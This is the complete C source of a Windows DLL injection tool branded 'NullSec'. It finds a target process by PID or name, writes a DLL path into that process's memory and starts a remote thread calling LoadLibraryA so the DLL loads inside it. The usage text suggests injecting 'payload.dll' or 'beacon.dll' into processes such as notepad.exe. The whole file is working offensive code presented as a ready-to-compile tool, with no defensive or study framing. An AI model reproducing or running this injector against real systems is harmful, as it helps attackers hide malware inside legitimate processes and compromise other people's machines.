/*
 * NullSec Windows DLL Injector
 * Inject DLLs into running processes
 * Compile: cl.exe /O2 dll_inject.c /link kernel32.lib
 * Or: x86_64-w64-mingw32-gcc -o nullsec-inject.exe dll_inject.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <windows.h>
#include <tlhelp32.h>

#define RED     ""
#define GREEN   ""
#define CYAN    ""
#define RESET   ""
#else
// Cross-compile stubs
typedef void* HANDLE;
typedef unsigned long DWORD;
typedef int BOOL;
#define RED     "\033[0;31m"
#define GREEN   "\033[0;32m"
#define CYAN    "\033[0;36m"
#define RESET   "\033[0m"
#endif

void banner() {
    printf(CYAN);
    printf("\n+=======================================+\n");
    printf("|   NullSec DLL Injector - Windows      |\n");
    printf("|   Fast C-based process injection      |\n");
    printf("+=======================================+\n");
    printf(RESET);
}

#ifdef _WIN32
DWORD find_process_id(const char* process_name) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(snapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, process_name) == 0) {
                CloseHandle(snapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snapshot, &pe));
    }
    
    CloseHandle(snapshot);
    return 0;
}

void list_processes() {
    printf("\n[*] Running processes:\n\n");
    printf("%-8s %-30s\n", "PID", "NAME");
    printf("----------------------------------------\n");
    
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to get process list\n");
        return;
    }
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    
    int count = 0;
    if (Process32First(snapshot, &pe)) {
        do {
            printf("%-8lu %-30s\n", pe.th32ProcessID, pe.szExeFile);
            count++;
        } while (Process32Next(snapshot, &pe) && count < 50);
    }
    
    if (count >= 50) {
        printf("... (showing first 50)\n");
    }
    
    CloseHandle(snapshot);
}

int inject_dll(DWORD pid, const char* dll_path) {
    printf("[*] Target PID: %lu\n", pid);
    printf("[*] DLL Path: %s\n", dll_path);
    
    // Open target process
    HANDLE process = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid
    );
    
    if (!process) {
        printf(RED "[!] Failed to open process (Error: %lu)\n" RESET, GetLastError());
        return -1;
    }
    
    printf("[+] Process opened\n");
    
    // Get LoadLibraryA address
    HMODULE kernel32 = GetModuleHandle("kernel32.dll");
    FARPROC load_library = GetProcAddress(kernel32, "LoadLibraryA");
    
    if (!load_library) {
        printf(RED "[!] Failed to get LoadLibraryA address\n" RESET);
        CloseHandle(process);
        return -1;
    }
    
    printf("[+] LoadLibraryA at: %p\n", load_library);
    
    // Allocate memory in target process
    size_t path_len = strlen(dll_path) + 1;
    LPVOID remote_mem = VirtualAllocEx(
        process, NULL, path_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!remote_mem) {
        printf(RED "[!] Failed to allocate memory (Error: %lu)\n" RESET, GetLastError());
        CloseHandle(process);
        return -1;
    }
    
    printf("[+] Memory allocated at: %p\n", remote_mem);
    
    // Write DLL path to target process
    SIZE_T written;
    if (!WriteProcessMemory(process, remote_mem, dll_path, path_len, &written)) {
        printf(RED "[!] Failed to write memory (Error: %lu)\n" RESET, GetLastError());
        VirtualFreeEx(process, remote_mem, 0, MEM_RELEASE);
        CloseHandle(process);
        return -1;
    }
    
    printf("[+] Wrote %zu bytes to target\n", written);
    
    // Create remote thread to load DLL
    HANDLE thread = CreateRemoteThread(
        process, NULL, 0,
        (LPTHREAD_START_ROUTINE)load_library,
        remote_mem, 0, NULL
    );
    
    if (!thread) {
        printf(RED "[!] Failed to create remote thread (Error: %lu)\n" RESET, GetLastError());
        VirtualFreeEx(process, remote_mem, 0, MEM_RELEASE);
        CloseHandle(process);
        return -1;
    }
    
    printf("[+] Remote thread created\n");
    
    // Wait for thread to complete
    WaitForSingleObject(thread, INFINITE);
    
    // Cleanup
    DWORD exit_code;
    GetExitCodeThread(thread, &exit_code);
    
    CloseHandle(thread);
    VirtualFreeEx(process, remote_mem, 0, MEM_RELEASE);
    CloseHandle(process);
    
    if (exit_code) {
        printf(GREEN "[+] DLL injected successfully!\n" RESET);
        return 0;
    } else {
        printf(RED "[!] DLL load may have failed\n" RESET);
        return -1;
    }
}
#endif

void usage(const char* prog) {
    printf("\nUsage: %s [options]\n\n", prog);
    printf("Options:\n");
    printf("  -l, --list              List running processes\n");
    printf("  -p, --pid <PID>         Target process ID\n");
    printf("  -n, --name <name>       Target process name\n");
    printf("  -d, --dll <path>        DLL to inject\n");
    printf("\nExamples:\n");
    printf("  %s -l\n", prog);
    printf("  %s -p 1234 -d payload.dll\n", prog);
    printf("  %s -n notepad.exe -d beacon.dll\n", prog);
}

int main(int argc, char* argv[]) {
    banner();
    
#ifndef _WIN32
    printf("\n[!] This tool only works on Windows\n");
    printf("[*] Cross-compile with: x86_64-w64-mingw32-gcc\n");
    return 1;
#else
    
    if (argc < 2) {
        usage(argv[0]);
        return 1;
    }
    
    DWORD pid = 0;
    char* dll_path = NULL;
    char* proc_name = NULL;
    int list_procs = 0;
    
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-l") == 0 || strcmp(argv[i], "--list") == 0) {
            list_procs = 1;
        } else if ((strcmp(argv[i], "-p") == 0 || strcmp(argv[i], "--pid") == 0) && i + 1 < argc) {
            pid = atol(argv[++i]);
        } else if ((strcmp(argv[i], "-n") == 0 || strcmp(argv[i], "--name") == 0) && i + 1 < argc) {
            proc_name = argv[++i];
        } else if ((strcmp(argv[i], "-d") == 0 || strcmp(argv[i], "--dll") == 0) && i + 1 < argc) {
            dll_path = argv[++i];
        }
    }
    
    if (list_procs) {
        list_processes();
        return 0;
    }
    
    if (proc_name) {
        pid = find_process_id(proc_name);
        if (pid == 0) {
            printf(RED "[!] Process not found: %s\n" RESET, proc_name);
            return 1;
        }
        printf("[+] Found %s at PID %lu\n", proc_name, pid);
    }
    
    if (pid == 0 || dll_path == NULL) {
        usage(argv[0]);
        return 1;
    }
    
    return inject_dll(pid, dll_path);
#endif
}
